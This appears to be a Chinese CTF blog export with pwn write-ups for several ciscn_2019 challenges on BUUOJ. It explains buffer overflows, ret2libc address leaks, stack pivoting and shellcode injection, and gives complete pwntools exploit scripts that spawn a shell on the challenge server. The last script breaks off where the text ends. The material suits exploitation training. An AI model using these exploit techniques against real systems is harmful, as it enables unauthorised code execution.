<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">encrypt</span><span class="params">()</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">48</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF     //第一个参数距离rbp为50h，代表该函数开辟了50h的空间赋予了变量</span></span><br><span class="line">  __int16 v3; <span class="comment">// [rsp+30h] [rbp-20h]</span></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input your Plaintext to be encrypted&quot;</span>);</span><br><span class="line">  </span><br><span class="line">  gets(s);             <span class="comment">//输入字符串，并没有做输入限制，s的长度本身是48，超过48就会溢出，该函数读到 \n 结束</span></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">​    v0 = (<span class="type">unsigned</span> <span class="type">int</span>)x;</span><br><span class="line">​    <span class="keyword">if</span> ( v0 &gt;= <span class="built_in">strlen</span>(s) )   <span class="comment">//替换字符，使用strlen来判断长度，到 \0 为结束</span></span><br><span class="line">​      <span class="keyword">break</span>;</span><br><span class="line">​    <span class="keyword">if</span> ( s[x] &lt;= <span class="number">96</span> || s[x] &gt; <span class="number">122</span> )</span><br><span class="line">​    &#123;</span><br><span class="line">​      <span class="keyword">if</span> ( s[x] &lt;= <span class="number">64</span> || s[x] &gt; <span class="number">90</span> )</span><br><span class="line">​      &#123;</span><br><span class="line">​        <span class="keyword">if</span> ( s[x] &gt; <span class="number">47</span> &amp;&amp; s[x] &lt;= <span class="number">57</span> )</span><br><span class="line">​          s[x] ^= <span class="number">0xF</span>u;</span><br><span class="line">​      &#125;</span><br><span class="line">​      <span class="keyword">else</span></span><br><span class="line">​      &#123;</span><br><span class="line">​        s[x] ^= <span class="number">0xE</span>u;</span><br><span class="line">​      &#125;</span><br><span class="line">​    &#125;</span><br><span class="line">​    <span class="keyword">else</span></span><br><span class="line">​    &#123;</span><br><span class="line">​      s[x] ^= <span class="number">0xD</span>u;</span><br><span class="line">​    &#125;</span><br><span class="line">​    ++x;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Ciphertext&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/ciscn_2019_c_1/ciscn_2019_c_1(2).png"></p>
<p>调试并查看代码可知，该段encrypt函数会将所有可视字符替换为几个没意义的字符，因此需要进行绕过才可以进行溢出。</p>
<p>首先要计算溢出的长度，为了绕过strlen，我们要第一个字符需要使用 \0  ，因此就不能使用cyclic来计算溢出的长度的。</p>
<p>查看encrypt函数s的rbp和rsp可以知道该函数分配了50h的栈空间，也观察到该函数push了rbp，因此到函数返回地址需要 50h(变量空间) + 8(rbp空间)才到返回地址</p>
<p>由于延迟绑定的存在，我们需要暴露__libc_start_main函数的地址，也就是说，要利用puts函数来将__libc_start_main的got的值作为参数，然后传进去，让puts把真实地址打印出来，然后用在线平台或者Libcsearch工具根据该真实地址搜索lib版本，就可以得到其他lib函数的偏移量了。可以利用plt表中puts来打印。 got表和plt表可以通过elf来获取。</p>
<p>该文件是64位的，因此需要使用rdi来传参，这就要使用到 pop rdi ，可以使用ROPgadget来进行搜索</p>
<p><img src="/ciscn_2019_c_1/ciscn_2019_c_1(3).png"></p>
<p>因此第一个payload为： ‘&#x2F;0’ + ‘a’ *(50h-1+8) + pop rdi + LSM_got + puts plt + start</p>
<p>可以获取到__libc_start_main的函数真实地址，通过<a href="https://libc.blukat.me/">https://libc.blukat.me/</a> 以及最后三位的地址可以得到libc版本，不过通常只有一个难以确定libc的版本</p>
<p>因此使用puts以及__libc_start_main来确定版本。</p>
<p>第二个payload为： ‘&#x2F;0’ + ‘a’ *(50h-1+8) + pop rdi + puts_got + puts plt + start</p>
<p>得到LSM的最后三位地址为fc0，puts的最后三位地址为5a0，输入得到libc版本。注意，这里是本地的调试地址结果，和远程的不一定一样。</p>
<p><img src="/ciscn_2019_c_1/ciscn_2019_c_1(4).png"></p>
<p>本地利用在线网站的脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8*</span></span><br><span class="line"></span><br><span class="line">**<span class="keyword">from</span>** pwn **<span class="keyword">import</span>** *</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> **<span class="string">&quot;本地:1/远程:2&quot;</span>**</span><br><span class="line"></span><br><span class="line">select = <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line">p = process(**<span class="string">&#x27;./pwn&#x27;</span>**)</span><br><span class="line"></span><br><span class="line">**<span class="keyword">if</span>** select == <span class="number">1</span>:</span><br><span class="line"></span><br><span class="line">​    p = process(**<span class="string">&#x27;./pwn&#x27;</span>**)</span><br><span class="line"></span><br><span class="line">**<span class="keyword">else</span>**:</span><br><span class="line"></span><br><span class="line">​    p = remote(**<span class="string">&#x27;node4.buuoj.cn&#x27;</span>**,<span class="number">27707</span>)</span><br><span class="line"></span><br><span class="line">*<span class="comment">#elf = p.elf*</span></span><br><span class="line"></span><br><span class="line">elf = ELF(**<span class="string">&#x27;./pwn&#x27;</span>**)</span><br><span class="line"></span><br><span class="line">_start_addr = elf.symbols[**<span class="string">&#x27;_start&#x27;</span>**]</span><br><span class="line"></span><br><span class="line">LSM_got = elf.got[**<span class="string">&#x27;__libc_start_main&#x27;</span>**]</span><br><span class="line"></span><br><span class="line">puts_got = elf.got[**<span class="string">&#x27;puts&#x27;</span>**]</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[**<span class="string">&#x27;puts&#x27;</span>**]</span><br><span class="line"></span><br><span class="line">pop_rdi_addr = <span class="number">0x400c83</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(**<span class="string">&#x27;choice!****\n****&#x27;</span>**,**<span class="string">&#x27;1&#x27;</span>**)</span><br><span class="line"></span><br><span class="line">*<span class="comment">#0x0000000000400c83 : pop rdi ; ret*</span></span><br><span class="line"></span><br><span class="line">payload1 = **<span class="string">&#x27;****\0****&#x27;</span>** + **<span class="string">&#x27;a&#x27;</span>***(<span class="number">0x50</span>-<span class="number">1</span>+<span class="number">8</span>) + p64(pop_rdi_addr) +p64(LSM_got) + p64(puts_plt) + p64(_start_addr)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(**<span class="string">&#x27;encrypted****\n****&#x27;</span>**,payload1)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(p.recvline())</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(p.recvline())</span><br><span class="line"></span><br><span class="line">*<span class="comment">#puts_addr=u64(p.recvuntil(&#x27;\n&#x27;)[:-1].ljust(8,&#x27;\0&#x27;))*</span></span><br><span class="line"></span><br><span class="line">LSM_addr=u64(p.recvuntil(**<span class="string">&#x27;****\n****&#x27;</span>**,drop=**<span class="literal">True</span>**).ljust(<span class="number">8</span>,**<span class="string">&#x27;****\x00****&#x27;</span>**))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> **<span class="string">&#x27;LSM_addr:&#x27;</span>** + <span class="built_in">hex</span>(LSM_addr)</span><br><span class="line"></span><br><span class="line">payload2 = **<span class="string">&#x27;****\0****&#x27;</span>** + **<span class="string">&#x27;a&#x27;</span>***(<span class="number">0x50</span>-<span class="number">1</span>+<span class="number">8</span>) + p64(pop_rdi_addr) +p64(puts_got) + p64(puts_plt) + p64(_start_addr)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(**<span class="string">&#x27;choice!****\n****&#x27;</span>**,**<span class="string">&#x27;1&#x27;</span>**)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(**<span class="string">&#x27;encrypted****\n****&#x27;</span>**,payload2)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(p.recvline())</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(p.recvline())</span><br><span class="line"></span><br><span class="line">*<span class="comment">#puts_addr=u64(p.recvuntil(&#x27;\n&#x27;)[:-1].ljust(8,&#x27;\0&#x27;))*</span></span><br><span class="line"></span><br><span class="line">puts_addr=u64(p.recvuntil(**<span class="string">&#x27;****\n****&#x27;</span>**,drop=**<span class="literal">True</span>**).ljust(<span class="number">8</span>,**<span class="string">&#x27;****\x00****&#x27;</span>**))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> **<span class="string">&#x27;puts_addr:&#x27;</span>** + <span class="built_in">hex</span>(puts_addr)</span><br><span class="line"></span><br><span class="line">LSM_oft = <span class="number">0x26fc0</span></span><br><span class="line"></span><br><span class="line">system_oft = <span class="number">0x55410</span></span><br><span class="line"></span><br><span class="line">binsh_oft = <span class="number">0x1b75aa</span></span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x4006b9</span></span><br><span class="line"></span><br><span class="line">*<span class="comment">#0x00000000004006b9 : ret*</span></span><br><span class="line"></span><br><span class="line">basic_addr = LSM_addr - LSM_oft</span><br><span class="line"></span><br><span class="line">system_addr = basic_addr + system_oft</span><br><span class="line"></span><br><span class="line">binsh_addr = basic_addr + binsh_oft</span><br><span class="line"></span><br><span class="line">payload_getshell = **<span class="string">&#x27;****\0****&#x27;</span>** + **<span class="string">&#x27;a&#x27;</span>***(<span class="number">0x50</span>-<span class="number">1</span>+<span class="number">8</span>) + p64(ret) + p64(pop_rdi_addr) + p64(binsh_addr) + p64(system_addr) + p64(_start_addr)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(**<span class="string">&#x27;choice!****\n****&#x27;</span>**,**<span class="string">&#x27;1&#x27;</span>**)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(**<span class="string">&#x27;encrypted****\n****&#x27;</span>**,payload_getshell)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<p>使用LibcSearcher的脚本，注意，这里如果用本地测试是找不到对应的libc版本的，可能是因为我的ubuntu是20版本的原因，他没更新。</p>
<p>在payload中间添加一个ret是为了堆栈平衡，system(‘&#x2F;bin&#x2F;sh’)需要栈空间16位对准，这里使用一个ret占了占空间的8位，就可以使得栈变成对齐了</p>
<p><a href="http://blog.eonew.cn/archives/958">http://blog.eonew.cn/archives/958</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">print &quot;本地:1/远程:2&quot;</span><br><span class="line"></span><br><span class="line">select = input()</span><br><span class="line"></span><br><span class="line">p = process(&#x27;./pwn&#x27;)</span><br><span class="line"></span><br><span class="line">if select == 1:</span><br><span class="line"></span><br><span class="line">​    p = process(&#x27;./pwn&#x27;)</span><br><span class="line"></span><br><span class="line">else:</span><br><span class="line"></span><br><span class="line">​    p = remote(&#x27;node4.buuoj.cn&#x27;,27707)</span><br><span class="line"></span><br><span class="line">\#elf = p.elf</span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./pwn&#x27;)</span><br><span class="line"></span><br><span class="line">_start_addr = elf.symbols[&#x27;_start&#x27;]</span><br><span class="line"></span><br><span class="line">LSM_got = elf.got[&#x27;__libc_start_main&#x27;]</span><br><span class="line"></span><br><span class="line">puts_got = elf.got[&#x27;puts&#x27;]</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[&#x27;puts&#x27;]</span><br><span class="line"></span><br><span class="line">pop_rdi_addr = 0x400c83</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&#x27;choice!\n&#x27;,&#x27;1&#x27;)</span><br><span class="line"></span><br><span class="line">\#0x0000000000400c83 : pop rdi ; ret</span><br><span class="line"></span><br><span class="line">payload1 = &#x27;\0&#x27; + &#x27;a&#x27;*(0x50-1+8) + p64(pop_rdi_addr) +p64(LSM_got) + p64(puts_plt) + p64(_start_addr)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&#x27;encrypted\n&#x27;,payload1)</span><br><span class="line"></span><br><span class="line">print(p.recvline())</span><br><span class="line"></span><br><span class="line">print(p.recvline())</span><br><span class="line"></span><br><span class="line">\#puts_addr=u64(p.recvuntil(&#x27;\n&#x27;)[:-1].ljust(8,&#x27;\0&#x27;))</span><br><span class="line"></span><br><span class="line">LSM_addr=u64(p.recvuntil(&#x27;\n&#x27;,drop=True).ljust(8,&#x27;\x00&#x27;))</span><br><span class="line"></span><br><span class="line">print &#x27;LSM_addr:&#x27; + hex(LSM_addr)</span><br><span class="line"></span><br><span class="line">payload2 = &#x27;\0&#x27; + &#x27;a&#x27;*(0x50-1+8) + p64(pop_rdi_addr) +p64(puts_got) + p64(puts_plt) + p64(_start_addr)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&#x27;choice!\n&#x27;,&#x27;1&#x27;)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&#x27;encrypted\n&#x27;,payload2)</span><br><span class="line"></span><br><span class="line">print(p.recvline())</span><br><span class="line"></span><br><span class="line">print(p.recvline())</span><br><span class="line"></span><br><span class="line">\#puts_addr=u64(p.recvuntil(&#x27;\n&#x27;)[:-1].ljust(8,&#x27;\0&#x27;))</span><br><span class="line"></span><br><span class="line">puts_addr=u64(p.recvuntil(&#x27;\n&#x27;,drop=True).ljust(8,&#x27;\x00&#x27;))</span><br><span class="line"></span><br><span class="line">print &#x27;puts_addr:&#x27; + hex(puts_addr)</span><br><span class="line"></span><br><span class="line">LSM_oft = 0x26fc0</span><br><span class="line"></span><br><span class="line">system_oft = 0x55410</span><br><span class="line"></span><br><span class="line">binsh_oft = 0x1b75aa</span><br><span class="line"></span><br><span class="line">ret = 0x4006b9</span><br><span class="line"></span><br><span class="line">\#0x00000000004006b9 : ret</span><br><span class="line"></span><br><span class="line">basic_addr = LSM_addr - LSM_oft</span><br><span class="line"></span><br><span class="line">system_addr = basic_addr + system_oft</span><br><span class="line"></span><br><span class="line">binsh_addr = basic_addr + binsh_oft</span><br><span class="line"></span><br><span class="line">payload_getshell = &#x27;\0&#x27; + &#x27;a&#x27;*(0x50-1+8) + p64(ret) + p64(pop_rdi_addr) + p64(binsh_addr) + p64(system_addr) + p64(_start_addr)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&#x27;choice!\n&#x27;,&#x27;1&#x27;)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&#x27;encrypted\n&#x27;,payload_getshell)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>ret2libc</tag>
        <tag>64bit</tag>
        <tag>堆栈平衡</tag>
        <tag>gets</tag>
        <tag>strlen</tag>
      </tags>
  </entry>
  <entry>
    <title>ciscn_2019_en_2</title>
    <url>/ciscn_2019_en_2/</url>
    <content><![CDATA[<h1 id="ciscn-2019-en-2"><a href="#ciscn-2019-en-2" class="headerlink" title="ciscn_2019_en_2"></a>ciscn_2019_en_2</h1><p>与ciscn_2019_c_1一样 完善一个细节上不太相同的payload</p>
<p><img src="/ciscn_2019_en_2/ciscn_2019_en_2(1).png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">\<span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29288</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">LSM_got = elf.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">_start_addr = elf.symbols[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line"></span><br><span class="line">\<span class="comment">#0x0000000000400c83 : pop rdi ; ret</span></span><br><span class="line"></span><br><span class="line">pop_rdi_addr = <span class="number">0x0000000000400c83</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;choice!\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;encrypted\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">\<span class="comment">#payload1 = &#x27;\0&#x27; + &#x27;a&#x27;*(0x50+7) + p64(pop_rdi_addr) + p64(LSM_got) + p64(puts_plt) + p64(_start_addr)</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">&#x27;\0&#x27;</span> + <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x50</span>+<span class="number">7</span>) + p64(pop_rdi_addr) + p64(puts_got) + p64(puts_plt) + p64(_start_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload1)   <span class="comment">#&#x27;\0&#x27;代表ascii码为0的字符，即空字符，是字符串的结束标记</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(p.recvline())</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(p.recvline())</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;######&#x27;</span>)        <span class="comment">#方便查看第几行出现了地址</span></span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;puts_addr: &#x27;</span>+<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line"></span><br><span class="line">base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line"></span><br><span class="line">system_addr = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">str_binsh_addr = base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ret_addr = <span class="number">0x00000000004006b9</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;choice!\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;encrypted\n&#x27;</span>)  </span><br><span class="line"></span><br><span class="line">\<span class="comment">#0x00000000004006b9 : ret   </span></span><br><span class="line"></span><br><span class="line">\<span class="comment">#system函数要求栈地址的十六位对齐（即最后四位要求0000），使用一个ret来占据一个栈（64位，8个字节，栈一个字节一位，本来是1000的，加了个ret后就变成了0000）</span></span><br><span class="line"></span><br><span class="line">\<span class="comment">#32位的栈也同理，32位，4个字节，本来0100的，加了3个ret后变成0000</span></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">&#x27;\0&#x27;</span> + <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x50</span>+<span class="number">7</span>) + p64(ret_addr) + p64(pop_rdi_addr) + p64(str_binsh_addr) + p64(system_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="/ciscn_2019_en_2/ciscn_2019_en_2(2).png"></p>
<p><img src="/ciscn_2019_en_2/ciscn_2019_en_2(3).png"></p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>ret2libc</tag>
        <tag>64bit</tag>
        <tag>gets</tag>
        <tag>strlen</tag>
      </tags>
  </entry>
  <entry>
    <title>ciscn_2019_es_2</title>
    <url>/ciscn_2019_es_2/</url>
    <content><![CDATA[<h1 id="ciscn-2019-es-2"><a href="#ciscn-2019-es-2" class="headerlink" title="ciscn_2019_es_2"></a>ciscn_2019_es_2</h1><p>栈迁移  栈地址暴露</p>
<p><a href="https://blog.csdn.net/mcmuyanga/article/details/109318321">https://blog.csdn.net/mcmuyanga/article/details/109318321</a></p>
<p>该题是溢出点只能覆盖到rbp和ret，而程序可以暴露rbp地址，因此通过levae和ret巧妙修改rbp，控制rsp和eip，使得程序跳转到我们可以控制的写入域s中，让eip跳转到system的plt地址中，指向system，后面通过rbp的偏移地址来传参构造rop，成功getshell。</p>
<p><img src="/ciscn_2019_es_2/1.jpg"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  init();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome, my friend. What&#x27;s your name?&quot;</span>);</span><br><span class="line">  vul();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">vul</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">40</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x30</span>u);      <span class="comment">//存在溢出点，可以溢出8个字节，也就是rbp加ret，构造不了rop</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, s); <span class="comment">//打印内容，遇到/0结束打印，如果填满s，这样就没法在末尾补上’\0‘，则可以让printf把rbp给暴露出来</span></span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x30</span>u);      <span class="comment">//溢出两次</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">hack</span><span class="params">()</span>         <span class="comment">//看起来是执行这个，但实际上只是打印了一个flag字符串到屏幕</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;echo flag&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>对第一个read进行调试，输入abcdeeff，查看与栈中rbp的偏差量，可以看到ebp的值为0xffffd4e8，而输入的值存储在0xffffd4b0，相差0x38，即ebp-0x38&#x3D;输入内容的起始地址</p>
<p><img src="/ciscn_2019_es_2/2.jpg"></p>
<p>在第一次的read和printf结合中暴露rbp地，然后在第二次的read进行溢出，修改rbp地址，然后在前0x28的内容中构造system(‘&#x2F;bin&#x2F;sh’)，在原rbp位置修改地址为写入的地址位置，修改ret为leave ret地址。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">栈迁移核心思想就是利用leave和ret转移ebp和esp。leave和ret常用于复原栈</span><br><span class="line"></span><br><span class="line">leave=mov esp,ebp    使用溢出覆盖了rbp，则控制了esp，</span><br><span class="line">pop ebp             pop的第一个参数就是esp指向的位置，这个无所谓，随便值都可以</span><br><span class="line">ret=pop eip         pop的第二个参数控制了程序流程，最关键的点，用于调用system函数</span><br></pre></td></tr></table></figure>

<p>根据上面的思想，构造如下的payload</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;node4.buuoj.cn&#x27;,27727)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">leave_ret = <span class="number">0x080484b8</span></span><br><span class="line">p.recvline()</span><br><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x26</span>+<span class="string">&#x27;b&#x27;</span>*<span class="number">2</span>   <span class="comment">#填满s，不让程序补充0x00</span></span><br><span class="line">p.send(payload1)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;aabb&#x27;</span>)</span><br><span class="line">ebp = u32(p.recv(<span class="number">4</span>))   <span class="comment">#接受的ebp的地址</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;ebp-----&gt;&quot;</span> + <span class="built_in">hex</span>(ebp)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#    padding    # system             #ret addr  #字符串地址，相对偏移16个字节   # bin sh</span></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x4</span> + p32(elf.plt[<span class="string">&#x27;system&#x27;</span>]) + <span class="string">&#x27;bbbb&#x27;</span> + p32(ebp-<span class="number">0x28</span>) + <span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">payload2=payload2.ljust(<span class="number">0x28</span>,<span class="string">&#x27;\x00&#x27;</span>)    <span class="comment">#右边为空的部分全部补\x00</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#           控制的地址起始位置    返回地址</span></span><br><span class="line"></span><br><span class="line">payload2+= p32(ebp-<span class="number">0x38</span>) + p32(leave_ret)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p,&quot;b *0x080485FD&quot;)</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>ret2libc</tag>
        <tag>32bit</tag>
        <tag>栈迁移</tag>
      </tags>
  </entry>
  <entry>
    <title>ciscn_2019_n_5</title>
    <url>/ciscn_2019_n_5/</url>
    <content><![CDATA[<h1 id="ciscn-2019-n-5"><a href="#ciscn-2019-n-5" class="headerlink" title="ciscn_2019_n_5"></a>ciscn_2019_n_5</h1><p>64位写入shellcode，有些小细节需要注意</p>
<p>使用checksec查看，发现nx没开，考虑可以shellcode</p>
<p><img src="/ciscn_2019_n_5/ciscn_2019_n_5(1).png"></p>
<p>使用ida查看main函数，可以得知，read可以用来写shellcode，gets溢出来把rip跳转到shellcode</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> text[<span class="number">30</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;tell me your name&quot;</span>);</span><br><span class="line"></span><br><span class="line">  read(<span class="number">0</span>, name, <span class="number">0x64</span>uLL);    <span class="comment">//写入到name中</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;wow~ nice name!&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What do you want to say to me?&quot;</span>);</span><br><span class="line"></span><br><span class="line">  gets(text);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>查看name，发现它具有rwx权限，确定可以使用shellcode了。</p>
<p><img src="/ciscn_2019_n_5/ciscn_2019_n_5(2).png"></p>
<p><img src="/ciscn_2019_n_5/ciscn_2019_n_5(3).png"></p>
<p>构造payload，在根目录获取到flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">\<span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26382</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)    <span class="comment">#如果不加上这个，则无法执行shellcode，估计是要指明shellcode的操作系统</span></span><br><span class="line"></span><br><span class="line">mem_addr = <span class="number">0x0000000000601080</span>   <span class="comment">#shellcode写入的地址，可以使用pwndgb的vmmap命令查看各个内存的权限情况，该段权限为rwx</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh()) </span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;name\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(shellcode)     <span class="comment">#写入shellcode</span></span><br><span class="line"></span><br><span class="line">payload = <span 